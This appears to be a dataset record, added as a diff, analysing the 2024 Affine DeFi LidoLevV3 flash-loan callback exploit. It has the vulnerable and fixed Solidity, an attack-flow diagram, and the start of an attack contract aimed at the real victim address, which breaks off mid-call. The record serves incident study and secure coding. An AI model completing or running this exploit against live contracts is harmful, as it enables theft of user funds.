@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-02-01_AffineDeFi_FlashLoanCallback",
+ "source_file": "2024/2024-02-01_AffineDeFi_FlashLoanCallback.md",
+ "title": "Affine DeFi (LidoLevV3) — Flash Loan Callback Exploitation Analysis",
+ "date": "2024-02-01",
+ "protocol": "Affine DeFi",
+ "chain": "Ethereum",
+ "loss_raw": "~33 aEthwstETH",
+ "loss_usd": null,
+ "root_cause": "LidoLevV3's `receiveFlashLoan` callback does not validate the caller (msg.sender), allowing arbitrary triggering to manipulate internal state",
+ "attack_tx": null,
+ "vulnerable_contract": "LidoLevV3 0xcd6ca2f0",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no callback caller validation\nfunction receiveFlashLoan(\n    IERC20[] memory tokens,\n    uint256[] memory amounts,\n    uint256[] memory feeAmounts,\n    bytes memory userData\n) external {\n    // Does not verify that msg.sender is the Balancer Vault\n    // Attacker can call this directly\n    _processCallback(tokens, amounts, userData);\n}\n\n//",
+  "// File: LidoLevEthStrategy.sol\ncontract LidoLevEthStrategy is LidoLevV3 {\n    constructor(AffineVault _vault, address[] memory strategists) LidoLevV3(_vault, strategists) {}  // ❌ vulnerability\n}"
+ ],
+ "code_after": [
+  "✅ Safe code: callback caller + initiator validation\naddress immutable balancerVault;\n\nfunction receiveFlashLoan(...) external {\n    require(msg.sender == balancerVault, \"not balancer vault\");\n    require(_flashLoanInitiator == address(this), \"not self-initiated\");\n    _processCallback(tokens, amounts, userData);\n}"
+ ],
+ "steps": [
+  "→ [1] First Balancer flash loan with callback data type 1",
+  "→ [2] receiveFlashLoan callback (type 1)",
+  "→ [3] Second Balancer flash loan with callback data type 2",
+  "0 WETH (callback trigger only)",
+  "→ [4] receiveFlashLoan callback (type 2)",
+  "→ [5] ~33 aEthwstETH profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] First Balancer flash loan with callback data type 1\n  │         └─ Large WETH (318,973,831...)\n  │\n  ├─→ [2] receiveFlashLoan callback (type 1)\n  │         └─ Internal state manipulation — aEthwstETH balance manipulation\n  │\n  ├─→ [3] Second Balancer flash loan with callback data type 2\n  │         └─ 0 WETH (callback trigger only)\n  │\n  ├─→ [4] receiveFlashLoan callback (type 2)\n  │         └─ Withdraw aEthwstETH using manipulated state\n  │\n  └─→ [5] ~33 aEthwstETH profit",
+  "interface ILidoLevV3 {\n    function receiveFlashLoan(\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external;\n}\n\ninterface IBalancer {\n    function flashLoan(\n        IFlashLoanRecipient recipient,\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external;\n}\n\ncontract AttackContract {\n    ILidoLevV3 constant victim   = ILidoLevV3(0xcd6ca2f0d0c182c5049d9a1f65cde51a706ae142);\n    IBalancer  constant balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n\n    function testExploit() external {\n        // [1] First flash loan (type 1 callback data)\n        bytes memory callbackData1 = abi.encode(uint256(1));\n        balancer.flashLoan(this,"
+ ]
+}
